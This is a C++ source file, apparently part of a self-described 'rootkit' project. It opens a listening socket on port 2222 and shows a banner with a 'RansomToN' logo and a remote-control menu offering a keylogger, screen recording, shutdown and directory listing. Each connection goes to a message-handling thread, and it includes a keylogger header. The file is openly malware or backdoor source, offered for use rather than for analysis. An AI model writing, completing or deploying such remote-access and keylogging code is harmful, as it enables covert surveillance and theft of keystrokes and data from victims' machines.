#include <cstdlib>
#include <iostream>
#include <winsock2.h>
#include <thread>
#include <atomic>
#include "../Tools/keylogger.h"
#include "../server/sendM.h"
#include "initSock.h"
#pragma comment(lib, "ws2_32.lib") // Link Winsock library

using namespace std;
const int PORT = 2222;

int SsocketHandle() {

    int serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == INVALID_SOCKET) {
        cout << "Socket creation failed with error: " << WSAGetLastError() << endl;
        WSACleanup();
        return 1;
    }
    cout << "Socket created successfully." << endl;

    sockaddr_in serverAddress;
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(PORT);
    serverAddress.sin_addr.s_addr = INADDR_ANY;

    int isBind = bind(serverSocket, (sockaddr*)&serverAddress, sizeof(serverAddress));
    if (isBind == SOCKET_ERROR) {
        cout << "Bind failed with error: " << WSAGetLastError() << endl;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }
    cout << "Socket bound to port " << PORT << endl;

    if (listen(serverSocket, 5) == SOCKET_ERROR) {
        cout << "Listen failed with error: " << WSAGetLastError() << endl;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }
    cout << "Server is listening on port " << PORT << endl;

    const char* banner = R"===(
 WELCOME TO Bliddy ROOTKIT >:}
                                                                                                  
  _____                              _______    _   _ 
 |  __ \                            |__   __|  | \ | |
 | |__) |__ _ _ __  ___  ___  _ __ ___ | | ___ |  \| |
 |  _  // _` | '_ \/ __|/ _ \| '_ ` _ \| |/ _ \| . ` |
 | | \ \ (_| | | | \__ \ (_) | | | | | | | (_) | |\  |
 |_|  \_\__,_|_| |_|___/\___/|_| |_| |_|_|\___/|_| \_|
                                                      
                                                      
                                               
                                                                                              
PRESS 1 FOR KEYLOGGER 
PRESS 2 FOR SENDING MESSAGE
PRESS 3 FOR SCREENRECORD
PRESS 4 FOR SHUTDOWN
PRESS 5 FOR TREE
)===";

cout << banner;
    while (true) {
        cout << "Waiting for a connection..." << endl;
        int clientSocket = accept(serverSocket, nullptr, nullptr);
        if (clientSocket == INVALID_SOCKET) {
            cout << "Accept failed with error: " << WSAGetLastError() << endl;
            continue;
        }
        cout << "Client connected." << endl;

        thread sendMessage(sendM,clientSocket);
        sendMessage.join();

        closesocket(serverSocket);
        WSACleanup();

        return 0;

    }
}

int main() {

    initSock();
    SsocketHandle();
    
}